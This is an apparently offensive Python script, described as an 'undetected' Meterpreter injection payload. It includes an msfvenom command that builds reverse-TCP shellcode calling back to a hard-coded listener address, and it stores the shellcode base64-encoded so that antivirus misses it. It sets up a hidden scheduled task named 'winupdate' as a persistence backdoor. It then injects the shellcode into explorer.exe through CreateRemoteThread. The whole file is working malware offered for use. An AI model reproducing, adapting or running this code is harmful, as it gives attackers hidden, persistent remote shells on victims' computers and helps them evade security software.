'''
Leg3nd @ https://leg3nd.me

Undetected meterpreter oode injection payload
This will inject meterpreter shellcode directly
into a given process and execute.

Use the following command in order to generate the shellcode (obviously replace IP/Port):
data=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.42.2 LPORT=587 -f c | tr -d '\"' | tr -d '\n' | awk -F= '{print $2}' | awk '{print $1}') ; python -c 'import base64;print base64.encodestring("'$data'").replace("\n","")'
'''

import sys, ctypes, re, base64, subprocess, os


#-------------------------------------------------------------------
# Target process to inject meterpreter into
process = "explorer.exe"
# Use base 64 representation of shellcode in the source in order
# to bypass anti-viruses in this EXE. You should also pack with UPX.
# 172.16.42.2 587
code1 = '/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaDMyAABod3MyX1RoTHcmB//VuJABAAApxFRQaCmAawD/1VBQUFBAUEBQaOoP3+D/1ZdqBWisECoCaAIAAkuJ5moQVldomaV0Yf/VhcB0DP9OCHXsaPC1olb/1WoAagRWV2gC2chf/9WLNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9UBwynGhfZ17MM7'
# 172.16.42.3 587 
code2 = '/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaDMyAABod3MyX1RoTHcmB//VuJABAAApxFRQaCmAawD/1VBQUFBAUEBQaOoP3+D/1ZdqBWisECoDaAIAAkuJ5moQVldomaV0Yf/VhcB0DP9OCHXsaPC1olb/1WoAagRWV2gC2chf/9WLNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9UBwynGhfZ17MM7'
#-------------------------------------------------------------------

# decode our shellcode for injetion
try:
  code1 = base64.decodestring(code1)
  code2 = base64.decodestring(code2)
except: pass

def code_inject(pid, sc):
  PAGE_EXECUTE_READWRITE         = 0x00000040
  PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )
  VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )
  kernel32      = ctypes.windll.kernel32
  
  shellcode = sc

  code_size     = len(shellcode)
  # Get a handle to the process we are injecting into.
  h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
  if not h_process:
    sys.exit(0)
  
  # Allocate some space for the shellcode
  arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
  # Write out the shellcode
  written = ctypes.c_int(0)
  kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, ctypes.byref(written))
  # Now we create the remote thread and point it's entry routine to be head of our shellcode
  thread_id = ctypes.c_ulong(0)
  kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,ctypes.byref(thread_id))

try:  
  # add a backdoor
  # create our schtasks XML file for some advanced settings
  exe_loc = str(sys.executable) 
  
  fileopen = open(os.getenv("TEMP") + "\\tmp.xml", "w")
  data = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT3M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2005-10-12T07:36:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>""" + exe_loc + """</Command>
    </Exec>
  </Actions>
</Task>"""
  fileopen.write(data)
  fileopen.close()
  
  #backdoor_command = 'SCHTASKS /f /Create /SC MINUTE /MO 3 /tn winupdate /TR "' + exe_loc + '"'
  backdoor_command = 'SCHTASKS /f /Create /tn winupdate /xml "' + str(os.getenv("TEMP") + "\\tmp.xml") + '"'
  proc = subprocess.Popen(backdoor_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  #os.remove(str(os.getenv("TEMP") + "\\tmp.xml"))
  
  # Enumerate PID
  proc = subprocess.Popen('tasklist | findstr %s'%process, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  proc = proc.communicate()[0]
  pid = re.search('\s\s\s\d+',proc)
  pid = int(pid.group().strip())
  
  # inject our code
  code_inject(pid,code1)
  code_inject(pid,code2)  
except: pass

